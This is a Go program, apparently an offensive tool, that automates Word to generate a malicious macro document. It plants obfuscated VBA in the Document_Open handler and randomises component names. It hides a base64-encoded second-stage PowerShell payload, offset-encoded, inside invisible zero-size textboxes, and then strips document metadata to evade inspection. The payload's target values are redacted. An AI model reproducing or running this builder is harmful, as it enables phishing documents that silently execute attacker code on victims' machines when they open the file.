// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"strconv"
	"strings"

	"golang.org/x/text/encoding/unicode"

	"github.com/oxis/gomacro/pkg/gomacro"
	"github.com/oxis/gomacro/pkg/obf"
	"github.com/oxis/gomacro/resources"
)

func addTextBox(n int, name string, text string, newForm *gomacro.Form) int {

	newForm.Add("forms.textbox.1", name)
	newForm.GetElement(name).SetProperty("Text", text)
	newForm.GetElement(name).SetProperty("Height", 0)
	newForm.GetElement(name).SetProperty("Width", 0)
	newForm.GetElement(name).SetProperty("PasswordChar", "C")
	newForm.GetElement(name).SetProperty("Enabled", false)

	n++
	return n
}

func addLabel(n int, name string, text string, newForm *gomacro.Form) int {

	newForm.Add("forms.label.1", name)
	newForm.GetElement(name).SetProperty("Caption", text)
	newForm.GetElement(name).SetProperty("Height", 0)
	newForm.GetElement(name).SetProperty("Width", 0)
	newForm.GetElement(name).SetProperty("Enabled", false)

	n++
	return n
}

func setupForm(strList map[string]map[int]string, nameMap map[string]string, newForm *gomacro.Form, code string) string {

	for n, value := range strList["TextBox"] {
		nameMap[fmt.Sprintf("TextBox%v", n)] = obf.RandStringBytes(12)
		fmt.Printf("TextBox%v text is %s\n", n, value)
		n = addTextBox(n, nameMap[fmt.Sprintf("TextBox%v", n)], value, newForm)
	}

	for n, value := range strList["Label"] {
		nameMap[fmt.Sprintf("Label%v", n)] = obf.RandStringBytes(12)
		fmt.Printf("Label%v text is %s\n", n, value)
		n = addLabel(n, nameMap[fmt.Sprintf("Label%v", n)], value, newForm)
	}

	for old, new := range nameMap {
		fmt.Printf("Replacing %s with %s\n", old, new)
		code = strings.ReplaceAll(code, old, new)
	}

	return code
}

func encode(str string, offset string, sep string) string {

	offset2, _ := strconv.Atoi(offset)

	ret := ""
	for _, i := range str {
		ret += fmt.Sprint(int(i)-offset2) + sep
	}

	return ret[:len(ret)-len(sep)]
}

// newEncodedPSScript returns a UTF16-LE, base64 encoded script.
// The -EncodedCommand parameter expects this encoding for any base64 script we send over.
func newEncodedPSScript(script string) (string, error) {
	uni := unicode.UTF16(unicode.LittleEndian, unicode.IgnoreBOM)
	encoded, err := uni.NewEncoder().String(script)
	if err != nil {
		return "", err
	}

	var encodedNull []byte = make([]byte, len(encoded)*2)
	for _, c := range encoded {
		encodedNull = append(encodedNull, byte(c), 0x00)
	}

	return base64.StdEncoding.EncodeToString([]byte(encoded)), nil
}

func main() {
	gomacro.Init()
	defer gomacro.Uninitialize()

	documents := gomacro.NewDocuments(false)
	defer documents.Close()

	fmt.Printf("Word version is %s\n", documents.Application.Version)

	document := documents.AddDocument()
	document.SaveAs("C:\\Users\\test\\go\\src\\github.com\\oxis\\gomacro\\cmd\\main\\Test.doc")

	document.VBProject.SetName(obf.RandStringBytes(12))

	thisDoc, err := document.VBProject.VBComponents.GetVBComponent("ThisDocument")
	if err != nil {
		fmt.Printf("%s", err)
		document.Save()
		documents.Close()
	}

	thisDoc.SetName(obf.RandStringBytes(12))

	code, funcMap, _, _ := obf.ObfuscateVBCode(resources.EntryPointFunction, 12)
	docOpen := fmt.Sprintf(resources.DocumentOpen, obf.RandStringBytes(12))
	docOpen = strings.ReplaceAll(docOpen, "EntryPoint", funcMap["EntryPoint"])

	thisDoc.CodeModule.AddFromString(docOpen)

	var nameMap map[string]string = make(map[string]string)

	nameMap["UserForm1"] = obf.RandStringBytes(12)
	newForm := document.VBProject.VBComponents.AddNewForm(nameMap["UserForm1"])
	newForm.SetProperty("Caption", obf.RandStringBytes(12))

	// Setup second stage
	resources.Payload = fmt.Sprintf(resources.Payload, "[REDACTED]", "[REDACTED]")

	b64Payload, _ := newEncodedPSScript(resources.Payload)
	finalPayload := fmt.Sprintf(resources.TextBox3, b64Payload)

	strList := map[string]map[int]string{
		"TextBox": {1: encode(resources.TextBox1, resources.Offset, resources.Sep),
			2: encode(resources.TextBox2, resources.Offset, resources.Sep),
			3: encode(finalPayload, resources.Offset, resources.Sep)},
		"Label": {1: resources.Label1,
			2: resources.Label2},
	}

	code = setupForm(strList, nameMap, newForm, code)

	newModule := document.VBProject.VBComponents.AddVBComponent(obf.RandStringBytes(12), gomacro.MODULE)
	newModule.CodeModule.AddFromString(code)

	document.Application.Options.SetOption("Pagination", false)
	document.Repaginate()
	document.Application.SetOption("ScreenUpdating", true)
	document.Application.ScreenRefresh()

	document.RemoveDocumentInformation(99)
	document.UndoClear()
	documents.Save()
}
